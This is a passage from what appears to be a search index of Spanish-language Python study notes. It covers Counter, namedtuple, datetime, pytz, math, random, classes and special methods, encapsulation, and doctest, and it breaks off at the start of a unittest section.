3})","title":"Contador"},{"location":"lenguajes/python3/apuntes-modulos/#most_common","text":"Permite mostrar los mas comunes c = Counter ( animales . split ()) c . most_common ( 1 ) [('perro', 3)] c . most_common ( 2 ) [('perro', 3), ('canario', 2)] c . most_common () [('perro', 3), ('canario', 2), ('gato', 1)]","title":"most_common()"},{"location":"lenguajes/python3/apuntes-modulos/#tuplas-con-nombres","text":"Subclase de las tuplas utilizada para crear peque\u00f1as estructuras inmutables, parecidas a una clase y sus objetos pero mucho m\u00e1s simples. t = ( 20 , 40 , 60 ) t [ 0 ] 20 t [ - 1 ] 60 from collections import namedtuple Persona = namedtuple ( 'Persona' , 'nombre apellido edad' ) p = Persona ( nombre = \"Hector\" , apellido = \"Costa\" , edad = 27 ) p . nombre 'Hector' p . apellido 'Costa' p . edad 27 p Persona(nombre='Hector', apellido='Costa', edad=27) p [ 0 ] 'Hector' p [ 1 ] 'Costa' p [ - 1 ] 27 Al ser una tupla, no se puede modificar p . nombre = \"Hola\" --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) < ipython - input - 91 - 5cd7aba08457 > in < module > () ---- > 1 p . nombre = \"Hola\" AttributeError: can't set attribute","title":"Tuplas con nombres"},{"location":"lenguajes/python3/apuntes-modulos/#el-modulo-datetime","text":"import datetime dt = datetime . datetime . now () # Ahora dt datetime.datetime(2016, 6, 18, 21, 29, 28, 607208) dt . year # a\u00f1o 2016 dt . month # mes 6 dt . day # d\u00eda 18 print ( \" {} : {} : {} \" . format ( dt . hour , dt . minute , dt . second )) 21:29:28 print ( \" {} / {} / {} \" . format ( dt . day , dt . month , dt . year )) 18/6/2016 Crear un datetime manualmente (year, month, day, hour=0, minute=0, second=0, microsecond=0, tzinfo=None) Notad que s\u00f3lo son obligatorios el a\u00f1o, el mes y el d\u00eda dt = datetime . datetime ( 2000 , 1 , 1 ) dt datetime.datetime(2000, 1, 1, 0, 0) dt . year = 3000 # Error en asignaci\u00f3n --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-18-f655491f2afa> in <module>() ----> 1 dt.year = 3000 AttributeError: attribute 'year' of 'datetime.date' objects is not writable dt = dt . replace ( year = 3000 ) # Asignaci\u00f3n correcta con .replace() dt datetime.datetime(3000, 1, 1, 0, 0)","title":"El m\u00f3dulo datetime"},{"location":"lenguajes/python3/apuntes-modulos/#formateos","text":"Formato autom\u00e1tico ISO (Organizaci\u00f3n Internacional de Normalizaci\u00f3n) dt = datetime . datetime . now () dt . isoformat () '2016-06-18T21:37:10.303386' Formateo munual (ingl\u00e9s por defecto) datetime-strftime dt . strftime ( \"%A %d %B %Y %I:%M\" ) 'Saturday 18 June 2016 09:37'","title":"Formateos"},{"location":"lenguajes/python3/apuntes-modulos/#tiempo-con-timedelta","text":"dt = datetime . datetime . now () dt datetime.datetime(2016, 6, 18, 21, 47, 13, 504534) t = datetime . timedelta ( days = 14 , hours = 4 , seconds = 1000 ) dentro_de_dos_semanas = dt + t dentro_de_dos_semanas datetime.datetime(2016, 7, 3, 2, 3, 53, 504534) dentro_de_dos_semanas . strftime ( \"%A %d de %B del %Y - %H:%M\" ) 'domingo 03 de julio del 2016 - 02:03' hace_dos_semanas = dt - t hace_dos_semanas . strftime ( \"%A %d de %B del %Y - %H:%M\" ) 's\u00e1bado 04 de junio del 2016 - 17:30'","title":"tiempo con timedelta"},{"location":"lenguajes/python3/apuntes-modulos/#codigos-de-idiomas","text":"https://msdn.microsoft.com/es-es/es/library/cdax410z.aspx import locale locale . setlocale ( locale . LC_ALL , 'es-ES' ) # Establece idioma en \"es-ES\" (espa\u00f1ol de Espa\u00f1a) locale . setlocale ( locale . LC_ALL , '' ) # Establece idioma del sistema 'es-ES' dt . strftime ( \"%A %d %B %Y %I:%M\" ) 's\u00e1bado 18 junio 2016 09:37' dt . strftime ( \"%A %d de %B del %Y - %H:%M\" ) # %I 12h - %H 24h 's\u00e1bado 18 de junio del 2016 - 21:37'","title":"C\u00f3digos de idiomas"},{"location":"lenguajes/python3/apuntes-modulos/#extra-zonas-horarias-con-pytz","text":"pip3 install pytz import pytz pytz . all_timezones [ 'Africa/Abidjan' , 'Africa/Accra' , 'Africa/Addis_Ababa' , 'Africa/Algiers' , 'Africa/Asmara' , 'Africa/Asmera' , 'Africa/Bamako' , 'Africa/Bangui' , 'Africa/Banjul' , 'Africa/Bissau' , 'Africa/Blantyre' , 'Africa/Brazzaville' , 'Africa/Bujumbura' , 'Africa/Cairo' , 'Africa/Casablanca' , 'Africa/Ceuta' , 'Africa/Conakry' , 'Africa/Dakar' , 'Africa/Dar_es_Salaam' , 'Africa/Djibouti' , 'Africa/Douala' , 'Africa/El_Aaiun' , 'Africa/Freetown' , ... # salen muchos, todos los del mmundo. dt = datetime . datetime . now ( pytz . timezone ( 'Asia/Tokyo' )) dt . strftime ( \"%A %d de %B del %Y - %H:%M\" ) # %I 12h - %H 24h 'domingo 19 de junio del 2016 - 04:52'","title":"Extra: Zonas horarias con pytz"},{"location":"lenguajes/python3/apuntes-modulos/#el-modulo-math","text":"import math","title":"El m\u00f3dulo math"},{"location":"lenguajes/python3/apuntes-modulos/#redondeos","text":"pi = 3.14159 round ( pi ) # Redondeo integrado 3 math . floor ( pi ) # Redondeo a la baja - Suelo 3 math . floor ( 3.99 ) 3 math . ceil ( pi ) # Redondeo al alta - Techo 4 math . ceil ( 3.01 ) 4","title":"Redondeos"},{"location":"lenguajes/python3/apuntes-modulos/#valor-absoluto","text":"abs ( - 10 ) 10","title":"Valor absoluto"},{"location":"lenguajes/python3/apuntes-modulos/#sumatorio","text":"# Sumatorio integrado n = [ 0.9999999 , 1 , 2 , 3 ] sum ( n ) 6.999999900000001 # Sumatorio mejorado para n\u00fameros reales math . fsum ( n ) 6.9999999","title":"Sumatorio"},{"location":"lenguajes/python3/apuntes-modulos/#truncamiento","text":"math . trunc ( 123.45 ) # Truncar, cortar la parte decimal 123","title":"Truncamiento"},{"location":"lenguajes/python3/apuntes-modulos/#potencias-y-raices","text":"math . pow ( 2 , 3 ) # Potencia con flotante 8.0 2 ** 3 # Potencia directa 8 math . sqrt ( 9 ) # Ra\u00edz cuadrada (square root) 3.0","title":"Potencias y ra\u00edces"},{"location":"lenguajes/python3/apuntes-modulos/#constantes","text":"math . pi # Constante pi 3.141592653589793 math . e # Constante e 2.718281828459045","title":"Constantes"},{"location":"lenguajes/python3/apuntes-modulos/#el-modulo-random","text":"import random random . random () # Flotante aleatorio >= 0 y < 1.0 0.12539542779843138 random . random () # Flotante aleatorio >= 0 y < 1.0 0.3332807222427663 random . uniform ( 1 , 10 ) # Flotante aleatorio >= 1 y <10.0 6.272300429556777 random . randrange ( 10 ) # Entero aleatorio de 0 a 9, 10 exclu\u00eddo 7 random . randrange ( 0 , 101 ) # Entero aleatorio de 0 a 100 14 random . randrange ( 0 , 101 , 2 ) # Entero aleatorio de 0 a 100 cada 2 n\u00fameros, m\u00faltiples de 2 68 random . randrange ( 0 , 101 , 5 ) # Entero aleatorio de 0 a 100 cada 5 n\u00fameros, m\u00faltiples de 5 25 c = 'Hola mundo' random . choice ( c ) # letra aleatoria 'o' l = [ 1 , 2 , 3 , 4 , 5 ] random . choice ( l ) # elemento aleatorio 3 random . shuffle ( l ) # barajar una lista, queda guardado l [3, 4, 2, 5, 1] random . sample ( l , 2 ) # muestra aleatoria de 2 elementos de la lista [3, 4]","title":"El m\u00f3dulo random"},{"location":"lenguajes/python3/apuntes-orientado-objetos/","text":"Orientado a objetos Orientado a objetos M\u00e9todo init M\u00e9todos especiales de clase Objetos dentro de objetos Objetos dentro de objetos M\u00e9todo init () Se llama autom\u00e1ticamente al crear una instancia de clase. class Galleta (): chocolate = False def __init__ ( self ): print ( \"Se acaba de crear una galleta.\" ) g = Galleta () Se acaba de crear una galleta. M\u00e9todos y la palabra self Self sirve para hacer referencia a los m\u00e9todos y atributos base de una clase dentro de sus propios m\u00e9todos. class Galleta (): chocolate = False def __init__ ( self ): print ( \"Se acaba de crear una galleta.\" ) def chocolatear ( self ): self . chocolate = True def tiene_chocolate ( self ): if ( self . chocolate ): print ( \"Soy una galleta chocolateada :-D\" ) else : print ( \"Soy una galleta sin chocolate :-(\" ) g = Galleta () # creo la galleta g . tiene_chocolate () # miro si hay chocolate g . chocolatear () # chocolateo la galleta g . tiene_chocolate () # miro si hay chocolate Se acaba de crear una galleta . Soy una galleta sin chocolate :- ( Soy una galleta chocolateada :- D Par\u00e1metros con valores por defecto en el init () Si no se ponen valores por defecto a las variables, en el caso de iniciar una galleta y no a\u00f1adir parametros mostrara error. class Galleta (): chocolate = False def __init__ ( self , sabor = None , forma = None ): self . sabor = sabor self . forma = forma if sabor is not None and forma is not None : print ( \"Se acaba de crear una galleta {} y {} \" . format ( sabor , forma )) def chocolatear ( self ): self . chocolate = True def tiene_chocolate ( self ): if ( self . chocolate ): print ( \"Soy una galleta chocolateada :-D\" ) else : print ( \"Soy una galleta sin chocolate :-(\" ) g = Galleta ( \"salada\" , \"cuadrada\" ) Se acaba de crear una galleta salada y cuadrada M\u00e9todos especiales de clase Constructor y destructor class Pelicula : # Constructor de clase (al crear la instancia) def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( \"Se ha creado la pel\u00edcula\" , self . titulo ) # Destructor de clase (al borrar la instancia) def __del__ ( self ): print ( \"Se est\u00e1 borrando la pel\u00edcula\" , self . titulo ) p = Pelicula ( \"El Padrino\" , 175 , 1972 ) Al finalizar el script el metodo del se ejecuta por defecto. Se ha creado la pel\u00edcula El Padrino Se est\u00e1 borrando la pel\u00edcula El Padrino String Para devolver una cadena por defecto al convertir un objeto a una cadena con str(objeto): class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( \"Se ha creado la pel\u00edcula\" , self . titulo ) # Destructor de clase def __del__ ( self ): print ( \"Se est\u00e1 borrando la pel\u00edcula\" , self . titulo ) # Redefinimos el m\u00e9todo string def __str__ ( self ): return \" {} lanzada en {} con una duraci\u00f3n de {} minutos\" . format ( self . titulo , self . lanzamiento , self . duracion ) p = Pelicula ( \"El Padrino\" , 175 , 1972 ) Se ha creado la pel\u00edcula El Padrino str ( p ) 'El Padrino lanzada en 1972 con una duraci\u00f3n de 175 minutos' Length Para devolver un n\u00famero que simula la longitud del objeto len(objeto): class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( \"Se ha creado la pel\u00edcula\" , self . titulo ) # Destructor de clase def __del__ ( self ): print ( \"Se est\u00e1 borrando la pel\u00edcula\" , self . titulo ) # Redefinimos el m\u00e9todo string def __str__ ( self ): return \" {} lanzada en {} con una duraci\u00f3n de {} minutos\" . format ( self . titulo , self . lanzamiento , self . duracion ) # Redefinimos el m\u00e9todo length def __len__ ( self ): return self . duracion p = Pelicula ( \"El Padrino\" , 175 , 1972 ) len ( p ) Se ha creado la pel\u00edcula El Padrino Se est\u00e1 borrando la pel\u00edcula El Padrino 175 Objetos dentro de objetos class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( 'Se ha creado la pel\u00edcula:' , self . titulo ) def __str__ ( self ): return ' {} ( {} )' . format ( self . titulo , self . lanzamiento ) Creando un cat\u00e1logo de pel\u00edculas class Catalogo : peliculas = [] # Esta lista contendr\u00e1 objetos de la clase Pelicula def __init__ ( self , peliculas = []): self . peliculas = peliculas def agregar ( self , p ): # p ser\u00e1 un objeto Pelicula self . peliculas . append ( p ) def mostrar ( self ): for p in self . peliculas : print ( p ) # Print toma por defecto str(p) p = Pelicula ( \"El Padrino\" , 175 , 1972 ) # creo pelicula c = Catalogo ([ p ]) # a\u00f1ado al catalogo Se ha creado la pel\u00edcula: El Padrino Muestro la peliculas del catalogo c . mostrar () El Padrino (1972) c . agregar ( Pelicula ( \"El Padrino: Parte 2\" , 202 , 1974 )) # A\u00f1adimos una pel\u00edcula directamente Se ha creado la pel\u00edcula: El Padrino: Parte 2 Muestro la peliculas del catalogo c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) Encapsulaci\u00f3n Consiste en denegar el acceso a los atributos y m\u00e9todos internos de la clase desde el exterior. En Python no existe, pero se puede simular precediendo atributos y m\u00e9todos con dos barras bajas __: class Ejemplo : __atributo_privado = \"Soy un atributo inalcanzable desde fuera\" def __metodo_privado ( self ): print ( \"Soy un m\u00e9todo inalcanzable desde fuera\" ) e = Ejemplo () e . __atributo_privado e . __metodo_privado () AttributeError: 'Ejemplo' object has no attribute '__atributo_privado' AttributeError: 'Ejemplo' object has no attribute '__metodo_privado' C\u00f3mo acceder Internamente la clase s\u00ed puede acceder a sus atributos y m\u00e9todos encapsulados, el truco consiste en crear sus equivalentes \"publicos\": class Ejemplo : __atributo_privado = \"Soy un atributo inalcanzable desde fuera\" def __metodo_privado ( self ): print ( \"Soy un m\u00e9todo inalcanzable desde fuera\" ) def atributo_publico ( self ): return self . __atributo_privado def metodo_publico ( self ): return self . __metodo_privado () e = Ejemplo () e . atributo_publico () 'Soy un atributo inalcanzable desde fuera' e . metodo_publico () Soy un m\u00e9todo inalcanzable desde fuera","title":"Orientado a objetos"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#orientado-a-objetos","text":"Orientado a objetos M\u00e9todo init M\u00e9todos especiales de clase Objetos dentro de objetos Objetos dentro de objetos","title":"Orientado a objetos"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#metodo-init","text":"Se llama autom\u00e1ticamente al crear una instancia de clase. class Galleta (): chocolate = False def __init__ ( self ): print ( \"Se acaba de crear una galleta.\" ) g = Galleta () Se acaba de crear una galleta.","title":"M\u00e9todo init()"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#metodos-y-la-palabra-self","text":"Self sirve para hacer referencia a los m\u00e9todos y atributos base de una clase dentro de sus propios m\u00e9todos. class Galleta (): chocolate = False def __init__ ( self ): print ( \"Se acaba de crear una galleta.\" ) def chocolatear ( self ): self . chocolate = True def tiene_chocolate ( self ): if ( self . chocolate ): print ( \"Soy una galleta chocolateada :-D\" ) else : print ( \"Soy una galleta sin chocolate :-(\" ) g = Galleta () # creo la galleta g . tiene_chocolate () # miro si hay chocolate g . chocolatear () # chocolateo la galleta g . tiene_chocolate () # miro si hay chocolate Se acaba de crear una galleta . Soy una galleta sin chocolate :- ( Soy una galleta chocolateada :- D","title":"M\u00e9todos y la palabra self"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#parametros-con-valores-por-defecto-en-el-init","text":"Si no se ponen valores por defecto a las variables, en el caso de iniciar una galleta y no a\u00f1adir parametros mostrara error. class Galleta (): chocolate = False def __init__ ( self , sabor = None , forma = None ): self . sabor = sabor self . forma = forma if sabor is not None and forma is not None : print ( \"Se acaba de crear una galleta {} y {} \" . format ( sabor , forma )) def chocolatear ( self ): self . chocolate = True def tiene_chocolate ( self ): if ( self . chocolate ): print ( \"Soy una galleta chocolateada :-D\" ) else : print ( \"Soy una galleta sin chocolate :-(\" ) g = Galleta ( \"salada\" , \"cuadrada\" ) Se acaba de crear una galleta salada y cuadrada","title":"Par\u00e1metros con valores por defecto en el init()"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#metodos-especiales-de-clase","text":"","title":"M\u00e9todos especiales de clase"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#constructor-y-destructor","text":"class Pelicula : # Constructor de clase (al crear la instancia) def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( \"Se ha creado la pel\u00edcula\" , self . titulo ) # Destructor de clase (al borrar la instancia) def __del__ ( self ): print ( \"Se est\u00e1 borrando la pel\u00edcula\" , self . titulo ) p = Pelicula ( \"El Padrino\" , 175 , 1972 ) Al finalizar el script el metodo del se ejecuta por defecto. Se ha creado la pel\u00edcula El Padrino Se est\u00e1 borrando la pel\u00edcula El Padrino","title":"Constructor y destructor"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#string","text":"Para devolver una cadena por defecto al convertir un objeto a una cadena con str(objeto): class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( \"Se ha creado la pel\u00edcula\" , self . titulo ) # Destructor de clase def __del__ ( self ): print ( \"Se est\u00e1 borrando la pel\u00edcula\" , self . titulo ) # Redefinimos el m\u00e9todo string def __str__ ( self ): return \" {} lanzada en {} con una duraci\u00f3n de {} minutos\" . format ( self . titulo , self . lanzamiento , self . duracion ) p = Pelicula ( \"El Padrino\" , 175 , 1972 ) Se ha creado la pel\u00edcula El Padrino str ( p ) 'El Padrino lanzada en 1972 con una duraci\u00f3n de 175 minutos'","title":"String"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#length","text":"Para devolver un n\u00famero que simula la longitud del objeto len(objeto): class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( \"Se ha creado la pel\u00edcula\" , self . titulo ) # Destructor de clase def __del__ ( self ): print ( \"Se est\u00e1 borrando la pel\u00edcula\" , self . titulo ) # Redefinimos el m\u00e9todo string def __str__ ( self ): return \" {} lanzada en {} con una duraci\u00f3n de {} minutos\" . format ( self . titulo , self . lanzamiento , self . duracion ) # Redefinimos el m\u00e9todo length def __len__ ( self ): return self . duracion p = Pelicula ( \"El Padrino\" , 175 , 1972 ) len ( p ) Se ha creado la pel\u00edcula El Padrino Se est\u00e1 borrando la pel\u00edcula El Padrino 175","title":"Length"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#objetos-dentro-de-objetos","text":"class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( 'Se ha creado la pel\u00edcula:' , self . titulo ) def __str__ ( self ): return ' {} ( {} )' . format ( self . titulo , self . lanzamiento )","title":"Objetos dentro de objetos"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#creando-un-catalogo-de-peliculas","text":"class Catalogo : peliculas = [] # Esta lista contendr\u00e1 objetos de la clase Pelicula def __init__ ( self , peliculas = []): self . peliculas = peliculas def agregar ( self , p ): # p ser\u00e1 un objeto Pelicula self . peliculas . append ( p ) def mostrar ( self ): for p in self . peliculas : print ( p ) # Print toma por defecto str(p) p = Pelicula ( \"El Padrino\" , 175 , 1972 ) # creo pelicula c = Catalogo ([ p ]) # a\u00f1ado al catalogo Se ha creado la pel\u00edcula: El Padrino Muestro la peliculas del catalogo c . mostrar () El Padrino (1972) c . agregar ( Pelicula ( \"El Padrino: Parte 2\" , 202 , 1974 )) # A\u00f1adimos una pel\u00edcula directamente Se ha creado la pel\u00edcula: El Padrino: Parte 2 Muestro la peliculas del catalogo c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974)","title":"Creando un cat\u00e1logo de pel\u00edculas"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#encapsulacion","text":"Consiste en denegar el acceso a los atributos y m\u00e9todos internos de la clase desde el exterior. En Python no existe, pero se puede simular precediendo atributos y m\u00e9todos con dos barras bajas __: class Ejemplo : __atributo_privado = \"Soy un atributo inalcanzable desde fuera\" def __metodo_privado ( self ): print ( \"Soy un m\u00e9todo inalcanzable desde fuera\" ) e = Ejemplo () e . __atributo_privado e . __metodo_privado () AttributeError: 'Ejemplo' object has no attribute '__atributo_privado' AttributeError: 'Ejemplo' object has no attribute '__metodo_privado'","title":"Encapsulaci\u00f3n"},{"location":"lenguajes/python3/apuntes-orientado-objetos/#como-acceder","text":"Internamente la clase s\u00ed puede acceder a sus atributos y m\u00e9todos encapsulados, el truco consiste en crear sus equivalentes \"publicos\": class Ejemplo : __atributo_privado = \"Soy un atributo inalcanzable desde fuera\" def __metodo_privado ( self ): print ( \"Soy un m\u00e9todo inalcanzable desde fuera\" ) def atributo_publico ( self ): return self . __atributo_privado def metodo_publico ( self ): return self . __metodo_privado () e = Ejemplo () e . atributo_publico () 'Soy un atributo inalcanzable desde fuera' e . metodo_publico () Soy un m\u00e9todo inalcanzable desde fuera","title":"C\u00f3mo acceder"},{"location":"lenguajes/python3/apuntes-test/","text":"Test Doctest Si por un lado las docstrings nos permit\u00edan describir documentaci\u00f3n, los doctest nos permiten combinar pruebas en la propia documentaci\u00f3n. Este concepto de integrar las pruebas en la documentaci\u00f3n nos ayuda a mantener las pruebas actualizadas, y adem\u00e1s nos sirve como ejemplo de utilizaci\u00f3n del c\u00f3digo, ayud\u00e1ndonos a explicar su prop\u00f3sito. Para utilizar doctests hay que inidicar una l\u00ednea dentro de la documentaci\u00f3n de la siguiente forma: >>> De esta Python entender\u00e1 que debe ejecutar el contenido dentro del comentario como si fuera c\u00f3digo normal, y lo har\u00e1 hasta que encuentre una l\u00ednea en blanco (o llegue al final de la documentaci\u00f3n). La mejor forma de ver a doctest en acci\u00f3n. Definiendo pruebas Por regla general cada prueba va ligada a una funcionalidad, pueden ser funciones, clases o sus m\u00e9todos. Por ejemplo, dada una funci\u00f3n suma ... def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos\"\"\" return a + b Para realizar una prueba dentro de la funci\u00f3n, vamos a ejecutar un c\u00f3digo de prueba de la propia suma: def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos >>> suma(5,10) \"\"\" return a + b Bien, ya tenemos la prueba, pero ahora nos falta indicarle a doctest cu\u00e1l es el resultado que deber\u00eda devolver la prueba, y eso lo indicaremos en la siguiente l\u00ednea: >>> def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos >>> suma(5,10) 15 \"\"\" return a + b \u00a1Muy bien! Ahora tenemos que ejecutar la pruebas y ver si funciona o no, pero antes tenemos que adaptar el c\u00f3digo. Ejecutando pruebas en un m\u00f3dulo Para ejecutar pruebas tendremos que utilizar la terminal, as\u00ed vamos a guardar la funci\u00f3n en un script test.py como si fuera un m\u00f3dulo con funciones. Ahora justo al final indicaremos que se ejecten las pruebas doctest de las funciones del m\u00f3dulo escribiendo el siguiente c\u00f3digo abajo del todo: import doctest doctest . testmod () # Notar que mod significa m\u00f3dulo Esto ser\u00eda suficiente, pero con el objetivo de evitar que este c\u00f3digo se ejecute al importarlo desde otro lugar, se suele indicar de la siguiente forma: if __name__ == \"__main__\" : import doctest doctest . testmod () As\u00ed \u00fanicamente se lanzar\u00e1n las pruebas al ejecutar directamente el m\u00f3dulo, y ya podremos ejecutar el m\u00f3dulo desde la terminal: python test.py Como resultado veremos que no se muestra nada. Eso no significa que no se ejecute nuestra prueba, sino que esta ha funcionado correctamente y no hay fallos. Si queremos podemos mostrar todo el registro de ejecuci\u00f3n pasando un argumento -v a python justo al final: python test.py -v Y entonces veremos el siguiente resultado: Trying: suma ( 5 ,10 ) Expecting: 15 ok 1 items had no tests: __main__ 1 items passed all tests: 1 tests in __main__.suma 1 tests in 2 items. 1 passed and 0 failed. Test passed. En el que se prueba el c\u00f3digo suma(5,10), se espera 15 y el resultado es ok; un resumen y finalmente Test passed. Creando varias pruebas Evidentemente podemos definir m\u00faltiples pruebas. Probemos tambi\u00e9n alguna que sabemos que es incorrecta: def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos >>> suma(5,10) 15 >>> suma(0,0) 1 >>> suma(-5,7) 2 \"\"\" return a + b Ahora, si ejecutamos el script de forma normal... python test.py A diferencia que antes s\u00ed que nos muestra algo, indic\u00e1ndonos que uno de los tests a fallado: ********************************************************************** File \"test.py\" , line 7 , in __main__.suma Failed example: suma ( 0 ,0 ) Expected: 1 Got: 0 ********************************************************************** 1 items had failures: 1 of 3 in __main__.suma ***Test Failed*** 1 failures. La cuesti\u00f3n ahora ser\u00eda revisar el test si es incorrecto, o adaptar la funci\u00f3n para que devuelve el resultado esperado en el test. Evidentemente en este caso hemos hecho un test incorrecto a prop\u00f3sito as\u00ed que simplemente lo borrar\u00edamos. Tests avanzados Hasta ahora hemos hecho unos tests muy simples, pero los doctests son muy flexibles. Algunas de sus funcionalidades interesantes son la posibilidad de ejecutar bloques de c\u00f3digo o la captura de excepciones. Para crear un test que incluya un bloque de c\u00f3digo, debemos utilizar las sentencias anidadas para simular tabulaciones: ... def doblar ( lista ): \"\"\"Dobla el valor de los elementos de una lista >>> l = [1, 2, 3, 4, 5] >>> doblar(l) [2, 4, 6, 8, 10] \"\"\" return [ n * 2 for n in lista ] En este caso hemos creado la lista del test manualmente, pero podr\u00edamos generarla con un bucle utilizando sentencias anidadas: def doblar ( lista ): \"\"\"Dobla el valor de los elementos de una lista >>> l = [1, 2, 3, 4, 5] >>> doblar(l) [2, 4, 6, 8, 10] >>> l = [] >>> for i in range(10): ... l.append(i) >>> doblar(l) [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] \"\"\" return [ n * 2 for n in lista ] Si ejecutamos el script monitorizando todo: python test.py -v Podemos observar la ejecuci\u00f3n del test avanzado: Trying: l = [ 1 , 2 , 3 , 4 , 5 ] Expecting nothing ok Trying: doblar ( l ) Expecting: [ 2 , 4 , 6 , 8 , 10 ] ok Trying: l = [] Expecting nothing ok Trying: for i in range ( 10 ) : l.append ( i ) Expecting nothing ok Trying: doblar ( l ) Expecting: [ 0 , 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 ] ok 1 items had no tests: __main__ 1 items passed all tests: 5 tests in __main__.doblar 5 tests in 2 items. 5 passed and 0 failed. Test passed. Por \u00faltimo vamos a volver a nuestra funci\u00f3n suma para tratar excepciones dentro de los tests. def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos Pueden ser n\u00fameros: >>> suma(5,10) 15 >>> suma(-5,7) 2 Cadenas de texto: >>> suma('aa','bb') 'aabb' O listas: >>> a = [1, 2, 3] >>> b = [4, 5, 6] >>> suma(a,b) [1, 2, 3, 4, 5, 6] \"\"\" return a + b Ahora sabemos que no podemos sumar tipos distintos, \u00bfc\u00f3mo podemos tenerlo en cuenta en un test? Pues por ahora podemos suponer un resultado y comprobar el resultado cuando falle: >>> suma ( 10 , \"hola\" ) \"10hola\" def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos Pueden ser n\u00fameros: >>> suma(5,10) 15 >>> suma(-5,7) 2 Cadenas de texto: >>> suma('aa','bb') 'aabb' O listas: >>> a = [1, 2, 3] >>> b = [4, 5, 6] >>> suma(a,b) [1, 2, 3, 4, 5, 6] Sin embargo no podemos sumar elementos de tipos diferentes: >>> suma(10,\"hola\") \"10hola\" \"\"\" return a + b Si ejecutamos el script monitorizando todo: python test.py -v Podemos observar el fallo: Trying: suma ( 5 ,10 ) Expecting: 15 ok Trying: suma ( -5,7 ) Expecting: 2 ok Trying: suma ( 'aa' , 'bb' ) Expecting: 'aabb' ok Trying: a = [ 1 , 2 , 3 ] Expecting nothing ok Trying: b = [ 4 , 5 , 6 ] Expecting nothing ok Trying: suma ( a,b ) Expecting: [ 1 , 2 , 3 , 4 , 5 , 6 ] ok Trying: suma ( 10 , \"hola\" ) Expecting: \"10hola\" ********************************************************************** File \"test.py\" , line 26 , in __main__.suma Failed example: suma ( 10 , \"hola\" ) Exception raised: Traceback ( most recent call last ) : File \"C:\\Program Files\\Anaconda3\\lib\\doctest.py\" , line 1321 , in __run compileflags, 1 ) , test.globs ) File \"<doctest __main__.suma[6]>\" , line 1 , in <module> suma ( 10 , \"hola\" ) File \"test.py\" , line 29 , in suma return a+b TypeError: unsupported operand type ( s ) for +: 'int' and 'str' 1 items had no tests: __main__ ********************************************************************** 1 items had failures: 1 of 7 in __main__.suma 7 tests in 2 items. 6 passed and 1 failed. ***Test Failed*** 1 failures. Concretamente debemos fijarnos en la primera l\u00ednea y \u00faltima de la excepci\u00f3n: Traceback ( most recent call last ) : ... TypeError: unsupported operand type ( s ) for +: 'int' and 'str' Y precisamente esto es lo que tenemos que indicar en el test: def suma ( a , b ): \"\"\"Esta funci\u00f3n recibe dos par\u00e1metros y devuelve la suma de ambos Pueden ser n\u00fameros: >>> suma(5,10) 15 >>> suma(-5,7) 2 Cadenas de texto: >>> suma('aa','bb') 'aabb' O listas: >>> a = [1, 2, 3] >>> b = [4, 5, 6] >>> suma(a,b) [1, 2, 3, 4, 5, 6] Sin embargo no podemos sumar elementos de tipos diferentes: >>> suma(10,\"hola\") Traceback (most recent call last): ... TypeError: unsupported operand type(s) for +: 'int' and 'str' \"\"\" return a + b Y con esto acabamos esta lecci\u00f3n en la que hemos visto como crear tests sencillos en la documentaci\u00f3n con doctest . En la siguiente veremos un tipo distinto de tests m\u00e1s avanzados, los tests unitarios o Unittest . Unittest El m\u00f3dulo unittest , a veces referido como PyUnit , forma parte de una serie de frameworks conocidos como xUnit . Estas librer\u00edas se encuentran en la mayor\u00eda de lenguajes y son casi un est\u00e1ndard a la hora de programar pruebas unitarias. A diferencia de doctest , unittest ofrece la posibilidad de crear las pruebas en el propio c\u00f3digo implementando una clase llamada unittest.TestCase en la que se incluir\u00e1 un kit o bater\u00eda de pruebas . Cada una de las pruebas puede devolver tres respuestas en funci\u00f3n del resultado: OK : Para indicar que la prueba se ha pasado \u00e9xitosamente. FAIL : Para indicar que la prueba no ha pasado \u00e9xitosamente lanzaremos una excepci\u00f3n AssertionError (sentencia verdadero-falso) ERROR : Para indicar que la prueba no ha pasado \u00e9xitosamente, pero el resultado en lugar 